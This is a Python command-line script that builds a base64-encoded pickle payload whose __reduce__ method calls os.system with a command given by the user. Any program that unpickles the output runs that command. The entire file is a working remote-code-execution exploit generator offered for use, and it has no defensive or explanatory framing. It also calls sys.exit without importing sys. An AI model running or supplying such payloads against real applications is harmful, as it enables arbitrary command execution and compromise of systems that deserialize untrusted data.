import pickle
import base64
import os
import argparse

class PickleRce:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))

def generate_payload(command):
    try:
        payload = pickle.dumps(PickleRce(command))
        encoded_payload = base64.b64encode(payload).decode('utf-8')
        return encoded_payload
    except Exception as e:
        print(f"Error generating payload: {e}")
        sys.exit(1)

def save_payload_to_file(payload, filename):
    try:
        with open(filename, 'w') as file:
            file.write(payload)
        print(f"Payload saved to {filename}")
    except Exception as e:
        print(f"Error saving payload to file: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Generate a base64 encoded Pickle RCE payload.")
    parser.add_argument("command", help="The command to execute.")
    parser.add_argument("-o", "--output", help="File to save the encoded payload.", default=None)
    
    args = parser.parse_args()
    command = args.command
    output_file = args.output
    
    print(f"Generating payload for command: {command}")
    encoded_payload = generate_payload(command)
    print("\nGenerated Payload (Base64 Encoded):")
    print(encoded_payload)
    
    if output_file:
        save_payload_to_file(encoded_payload, output_file)

if __name__ == "__main__":
    main()
